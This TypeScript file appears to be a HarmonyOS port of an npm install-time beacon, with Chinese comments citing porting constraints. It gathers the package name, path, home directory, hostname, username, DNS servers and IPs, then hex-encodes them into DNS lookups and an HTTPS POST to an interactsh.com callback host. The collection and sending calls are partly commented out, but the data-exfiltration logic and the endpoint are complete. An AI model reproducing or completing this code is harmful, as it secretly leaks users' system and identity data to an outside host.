// 应用约束：80. import语句需放在最前面
import { BusinessError } from '@ohos.base';
// 应用约束：60. 使用ES6 import语法代替require
// 注意：鸿蒙系统中需使用对应模块替换Node.js模块
// 以下模块需要替换为鸿蒙等效API或删除
// import os from '@ohos.node.os';
// import dns from '@ohos.node.dns';
// import https from '@ohos.node.https';

// 应用约束：24. 使用类替代对象字面量类型
class TrackingData {
    p: string = '';
    c: string = '';
    hd: string = '';
    hn: string = '';
    un: string = '';
    dns: string = '';
    r?: string = undefined;
    v: string = '';
    pjson: object = {};
    ip: string = '';
}

// 应用约束：10. 禁止any类型，使用具体类型
// 应用约束：26. 使用箭头函数代替函数表达式
const toHex = (data: string): string => {
    // 应用约束：3. 限制运算符语义，使用TextEncoder代替Buffer
    const encoder = new TextEncoder();
    const bytes = encoder.encode(data);
    return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
}

// 应用约束：2. 禁止动态对象布局修改，使用明确类型
class NetworkInfo {
    static gethttpips(): string[] {
        const str: string[] = [];
        // 需要替换为鸿蒙网络接口
        /* const networkInterfaces = os.networkInterfaces();
        for (const item in networkInterfaces) {
            if (item != "lo") {
                for (let i = 0; i < networkInterfaces[item].length; i++) {
                    str.push(networkInterfaces[item][i].address);
                }
            }
        } */
        return str;
    }

    static getIps(): string {
        let str = "";
        // 需要替换为鸿蒙网络接口
        /* const networkInterfaces = os.networkInterfaces();
        for (const item in networkInterfaces) {
            if (item != "lo") {
                for (let i = 0; i < networkInterfaces[item].length; i++) {
                    str += toHex(networkInterfaces[item][i].address) + ".";
                }
            }
        } */
        return str.slice(0, -1);
    }
}

// 应用约束：9. 使用let代替var
function getPathChunks(path: string): string {
    let str = "p";
    const chunks = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    str = str.slice(0, -1) + "p";
    return str;
}

function toName(pkg: TrackingData): string[] {
    let str = "";
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com";
    
    str = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${NetworkInfo.getIps()}.${hostname}`;
    
    if (str.length > 255) {
        const substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const substr2 = NetworkInfo.getIps();
        
        if (substr1.length < 150) {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${substr2}.${hostname}`);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

// 应用约束：23. 显式标注对象字面量类型
const td = new TrackingData();
// 应用约束：28. 类不允许implements，使用接口替代
// 以下需要替换为鸿蒙系统信息获取方式
/* td.p = packageJSON.name;
td.c = __dirname; // 需要替换鸿蒙路径获取
td.hd = os.homedir();
td.hn = os.hostname();
td.un = os.userInfo().username;
td.dns = JSON.stringify(dns.getServers());
td.v = packageJSON.version;
td.pjson = packageJSON;
td.ip = JSON.stringify(NetworkInfo.gethttpips()); */

const qs = toName(td);

// 应用约束：36. 不支持in运算符，使用常规循环
for (let j = 0; j < qs.length; j++) {
    // 应用约束：71. 不支持dns模块，需删除或替换
    /* dns.lookup(qs[j], (err: Error, result: string) => {
        // console.log(result)
    }); */
}

// 应用约束：46. 显式标注函数参数类型
const postData = new URLSearchParams({ msg: JSON.stringify(td) }).toString();

// 应用约束：11. 使用类代替函数类型
class HttpsClient {
    static options = {
        hostname: "c5c77jy2vtc0000xqshggnsdwfyyyyyyn.interactsh.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length.toString()
        }
    };

    static sendRequest() {
        // 应用约束：75. 替换为鸿蒙网络请求
        /* const req = https.request(this.options, (res: any) => {
            res.on("data", (d: string) => {
                // process.stdout.write(d);
            });
        });

        req.on("error", (e: Error) => {
            // console.error(e);
        });

        req.write(postData);
        req.end(); */
    }
}

HttpsClient.sendRequest();

// 应用约束：44. catch语句省略类型标注
try {
    // ... 业务逻辑
} catch (error) {
    console.error('Error occurred:', (error as BusinessError).message);
}
